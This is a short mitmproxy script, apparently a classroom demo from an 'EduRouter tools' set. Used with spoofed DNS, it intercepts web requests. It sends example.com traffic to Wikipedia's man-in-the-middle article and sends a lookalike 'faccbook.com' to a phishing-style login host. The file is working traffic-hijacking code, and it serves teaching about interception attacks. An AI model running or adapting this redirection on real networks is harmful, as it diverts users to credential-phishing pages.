# This file is part of `EduRouter tools'

# This is intended for educational purposes

# Seeing is believing:
# use it together with DNS spoofing (modified hosts on router)

from mitmproxy import http

# In transparent proxy mode 'request.host' is an IP address
# To get host in URL form, use 'pretty_host' (takes the "Host" header from the request)
# https://docs.mitmproxy.org/stable/api/mitmproxy/http.html#Request.host

def request(flow: http.HTTPFlow) -> None:

    if flow.request.pretty_host.endswith("example.com") or flow.request.pretty_host.endswith("example.org"):
        print("")
        print("######  #    #    ##    #    #  #####   #       ######")
        print("#        #  #    #  #   ##  ##  #    #  #       #     ")
        print("#####     ##    #    #  # ## #  #    #  #       ##### ")
        print("#         ##    ######  #    #  #####   #       #     ")
        print("#        #  #   #    #  #    #  #       #       #     ")
        print("######  #    #  #    #  #    #  #       ######  ######")
        print("")
        print(flow.request.pretty_host)
        print("")
        flow.request.host = "en.wikipedia.org"
        flow.request.path = "/wiki/Man-in-the-middle_attack"

    if flow.request.pretty_host.endswith("faccbook.com"):    # spoofed DNS records for faccbook.com
        print("")
        print("######    ##     ####    ####   #####    ####    ####   #    #")
        print("#        #  #   #    #  #    #  #    #  #    #  #    #  #   # ")
        print("#####   #    #  #       #       #####   #    #  #    #  ####  ")
        print("#       ######  #       #       #    #  #    #  #    #  #  #  ")
        print("#       #    #  #    #  #    #  #    #  #    #  #    #  #   # ")
        print("#       #    #   ####    ####   #####    ####    ####   #    #")
        print("")
        print(flow.request.pretty_host)
        print("")
        flow.request.host = "www.fakebook.com.required.user-login-auth.online"

    # # for IP wait this way
    # if flow.request.host in ("172.18.27.36", "172.27.36.45"):
    #     pass
